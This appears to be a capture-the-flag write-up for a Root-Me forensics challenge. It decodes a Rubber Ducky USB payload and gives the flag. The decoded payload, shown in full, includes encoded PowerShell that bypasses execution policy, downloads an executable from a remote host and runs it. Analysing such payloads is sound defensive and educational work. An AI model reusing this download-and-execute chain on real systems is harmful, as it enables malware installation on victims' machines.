<h1>Ugly Duckling</h1>
<h3>Description</h3>
<label>The CEO’s computer seems to have been compromised internally. A young trainee dissatisfied with not having been paid during his internship arouse our supsicion. A strange USB stick containing a binary file was found on the trainee’s desk. The CEO relies on you to analyze this file.</label>
<h3>Solution</h3>
<label>File merupakan payload Rubber Ducky</label>

```console
┌──(root㉿Kali)-[/home/venom/Downloads]
└─# ducktools -d -l us file.bin result.txt 

[+] Reading Duck Bin file
  [-] Decoding file
  [-] Writing ducky text to result.txt
[+] Process Complete
                                                                                                               
┌──(root㉿Kali)-[/home/venom/Downloads]
└─# cat result.txt                    
DELAY
iexplore http://challenge01.root-me.org/forensic/ch14/files/796f75277665206265656e2054524f4c4c4544.jpgENTER
DELAY
DELAY
ENTER
DELAY
DELAY
%USERPROFILE%Documents796f75277665206265656e2054524f4c4c4544.jpgDELAY
ENTER
DELAY
TAB
DELAY
TAB
DELAY
TAB
DELAY
TAB
DELAY
TAB
DELAY
TAB
DELAY
TAB
DELAY
ENTER
DELAY
DOWNARROW
DELAY
DOWNARROW
DELAY
DOWNARROW
DELAY
DOWNARROW
DELAY
ENTER
DELAY
DOWNARROW
DELAY
DOWNARROW
DELAY
ENTER
DELAY
powershell Start-Process powershell -Verb runAsDELAY
PowerShell -Exec ByPass -Nol -Enc aQBlAHgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAEQAbwB3AG4AbABvAGEAZABGAGkAbABlACgAJwBoAHQAdABwADoALwAvAGMAaABhAGwAbABlAG4AZwBlADAAMQAuAHIAbwBvAHQALQBtAGUALgBvAHIAZwAvAGYAbwByAGUAbgBzAGkAYwAvAGMAaAAxADQALwBmAGkAbABlAHMALwA2ADYANgBjADYAMQA2ADcANgA3ADYANQA2ADQAMwBmAC4AZQB4AGUAJwAsACcANgA2ADYAYwA2ADEANgA3ADYANwA2ADUANgA0ADMAZgAuAGUAeABlACcAKQA7AApowershell -Exec ByPass -Nol -Enc aQBlAHgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAGMAbwBtACAAcwBoAGUAbABsAC4AYQBwAHAAbABpAGMAYQB0AGkAbwBuACkALgBzAGgAZQBsAGwAZQB4AGUAYwB1AHQAZQAoACcANgA2ADYAYwA2ADEANgA3ADYANwA2ADUANgA0ADMAZgAuAGUAeABlACcAKQA7AAoAexit                                                                                                               
┌──(root㉿Kali)-[/home/venom/Downloads]
└─# echo "aQBlAHgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAEQAbwB3AG4AbABvAGEAZABGAGkAbABlACgAJwBoAHQAdABwADoALwAvAGMAaABhAGwAbABlAG4AZwBlADAAMQAuAHIAbwBvAHQALQBtAGUALgBvAHIAZwAvAGYAbwByAGUAbgBzAGkAYwAvAGMAaAAxADQALwBmAGkAbABlAHMALwA2ADYANgBjADYAMQA2ADcANgA3ADYANQA2ADQAMwBmAC4AZQB4AGUAJwAsACcANgA2ADYAYwA2ADEANgA3ADYANwA2ADUANgA0ADMAZgAuAGUAeABlACcAKQA7AA" | base64 -d
iex (New-Object System.Net.WebClient).DownloadFile('http://challenge01.root-me.org/forensic/ch14/files/666c61676765643f.exe','666c61676765643f.exe'); 
```
<label>Download file dari payload link http://challenge01.root-me.org/forensic/ch14/files/666c61676765643f.exe lalu eksekusi</label>
<h3>Flag</h3>
<pre>
RubberDuckyFail3D
</pre>
